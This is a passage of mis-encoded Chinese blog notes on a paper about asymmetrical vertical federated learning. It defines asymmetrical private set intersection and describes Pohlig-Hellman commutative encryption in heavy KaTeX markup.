style="height:1.4604em;"><span></span></span></span></span></span></span><span class="mord">âˆ£</span><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="mord">âˆ£.</span></span></span></span></span></p><p><strong>å®šä¹‰2</strong>ï¼šéå¯¹ç§°PSIï¼ˆAsymmetrical PSIï¼ŒAPSIï¼‰åè®®ä¼šåœ¨åŒæ–¹äº§ç”Ÿä¸€ä¸ªæ‰°åŠ¨é›†åˆ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="script">I</mi><mrow><mi>o</mi><mi>b</mi><mi>f</mi></mrow></msup><mo>âŠ‚</mo><msubsup><mi mathvariant="script">I</mi><mi>s</mi><mi>o</mi></msubsup></mrow><annotation encoding="application/x-tex">\mathcal{I}^{o b f} \subset \mathcal{I}_{s}^{o}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8882em;vertical-align:-0.0391em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âŠ‚</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9303em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.453em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span> ï¼Œæ»¡è¶³ï¼š</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi mathvariant="script">I</mi><mn>1</mn></msub><mo>=</mo><msub><mi mathvariant="script">I</mi><mn>2</mn></msub><mo>âŠ‚</mo><msup><mi mathvariant="script">I</mi><mrow><mi>o</mi><mi>b</mi><mi>f</mi></mrow></msup><mo>âŠ‚</mo><msubsup><mi mathvariant="script">I</mi><mi>s</mi><mi>o</mi></msubsup></mrow><annotation encoding="application/x-tex">\mathcal{I}_{1}=\mathcal{I}_{2} \subset \mathcal{I}^{o b f} \subset \mathcal{I}_{s}^{o}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âŠ‚</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9382em;vertical-align:-0.0391em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âŠ‚</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9614em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-2.453em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span></span></p><p>æ­¤å¤–ï¼Œå¼±æ–¹ä¼šçŸ¥é“çœŸå®äº¤é›† <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">I</mi><mn>1</mn></msub><mo>=</mo><msub><mi mathvariant="script">I</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{I}_1=\mathcal{I}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ã€‚</p><p>APSIåè®®çš„ç»“æœå¦‚å›¾3æ‰€ç¤ºï¼š</p><p><img src="/2022/07/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2021-Asymmetrical-Vertical-Federated-Learning-%E7%AC%94%E8%AE%B0/image-20220717121516433.png" alt></p><h2 id="A-Pohlig-Hellman-Realization">A Pohlig-Hellman Realization</h2><p>ä½¿ç”¨<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>G</mi><mi>n</mi></msub><mo>=</mo><mo stretchy="false">(</mo><msubsup><mi mathvariant="double-struck">Z</mi><mi>n</mi><mo>âˆ—</mo></msubsup><mo separator="true">,</mo><mo>â‹…</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">G_n=(\mathbb{Z}_n^*, \cdot)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathbb">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">âˆ—</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">â‹…</span><span class="mclose">)</span></span></span></span>è¡¨ç¤ºä¸€ä¸ªä¹˜æ³•ç¾¤ï¼Œè€Œå Pohlig-HellmanåŠ å¯†ä½“åˆ¶å¯ä»¥ç”¨ä»¥ä¸‹3ä¸ªç»„ä»¶è¿›è¡Œæè¿°ï¼š</p><ol><li><p><strong>(Key generation)</strong> é€‰æ‹©1ä¸ªç´ æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span> ä½¿å¾—æ¯ä¸€ä¸ªæ˜æ–‡å…ƒç´ éƒ½æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> ä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶ä¸” <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">p-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>æœ‰è‡³å°‘1ä¸ªå¤§ç´ æ•°å› å­ã€‚ç„¶åé€‰æ‹© <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>âˆˆ</mo><msub><mi>G</mi><mrow><mi>p</mi><mo>âˆ’</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">a\in G_{p-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> å¹¶è®¡ç®— <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msup><mo>âˆˆ</mo><msub><mi>G</mi><mrow><mi>p</mi><mo>âˆ’</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">a^{-1}\in G_{p-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8532em;vertical-align:-0.0391em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>ã€‚æœ€åï¼Œä¸€æ–¹å±•ç¤º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> ä½œä¸ºå…¬å…±çŸ¥è¯†ï¼Œå¹¶å°†<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><msup><mi>a</mi><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(a, a^{-1})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>ä½œä¸º<em>å¯¹ç§°</em>å¯†ç ä½“ç³»çš„å¯†é’¥ã€‚</p></li><li><p><strong>(Encryption)</strong> åŠ å¯†æ˜æ–‡<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>âˆˆ</mo><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">m\in G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>ä¸ºï¼š</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>E</mi><mi>a</mi></msub><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>m</mi><mi>a</mi></msup></mrow><annotation encoding="application/x-tex">E_a(m)=m^a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7144em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span></span></span></span></span></p></li><li><p><strong>(Decryption)</strong> è§£å¯†å¯†æ–‡<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo>âˆˆ</mo><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">c\in G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>ä¸ºï¼š</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>D</mi><mi>a</mi></msub><mo stretchy="false">(</mo><mi>c</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>c</mi><msup><mi>a</mi><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msup></msup></mrow><annotation encoding="application/x-tex">D_a(c)=c^{a^{-1}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0369em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0369em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></p></li></ol><p>Pohlig-HellmanåŠ å¯†ä½“åˆ¶æ»¡è¶³<strong>äº¤æ¢å¾‹</strong>ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">âˆ€</mi><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo>âˆˆ</mo><msub><mi>G</mi><mrow><mi>p</mi><mo>âˆ’</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><msub><mi>E</mi><mi>a</mi></msub><mo>âˆ˜</mo><msub><mi>E</mi><mi>b</mi></msub><mo>=</mo><msub><mi>E</mi><mi>b</mi></msub><mo>âˆ˜</mo><msub><mi>E</mi><mi>a</mi></msub></mrow><annotation encoding="application/x-tex">\forall a,b\in G_{p-1},E_{a} \circ E_{b}=E_{b} \circ E_{a}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord">âˆ€</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ˜</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ˜</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ã€‚ï¼ˆâ€œå…ˆç”¨aåŠ å¯†å†ç”¨båŠ å¯†â€œå’Œâ€å…ˆç”¨båŠ å¯†å†ç”¨aåŠ å¯†â€œçš„å¯†æ–‡ç›¸åŒï¼‰ã€‚åŸºäºPohlig-HellmanåŠ å¯†çš„APSIåè®®å¦‚ç®—æ³•1æ‰€ç¤ºï¼š</p><p><img src="/2022/07/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2021-Asymmetrical-Vertical-Federated-Learning-%E7%AC%94%E8%AE%B0/image-20220717123409736.png" alt></p><p>å…¶ä¸­ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="normal">I</mi><mi mathvariant="normal">i</mi></msub></mrow><annotation encoding="application/x-tex">\mathrm{I_i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathrm">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3175em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 